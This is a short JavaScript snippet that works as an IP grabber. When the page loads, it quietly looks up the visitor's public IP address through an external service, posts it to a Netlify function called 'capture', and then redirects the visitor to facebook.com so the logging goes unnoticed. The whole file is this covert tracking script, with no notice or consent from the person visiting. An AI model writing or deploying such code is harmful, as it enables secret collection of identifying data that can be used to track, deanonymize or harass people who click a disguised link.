function getIpAddress() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(error => {
      console.error('Error fetching IP:', error);
      return 'Unknown';
    });
}

window.onload = function() {
  getIpAddress().then(ip => {
    fetch('/.netlify/functions/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip })
    })
    .then(response => {
      window.location.href = 'https://www.facebook.com';
    })
    .catch(() => {
      window.location.href = 'https://www.facebook.com';
    });
  });
};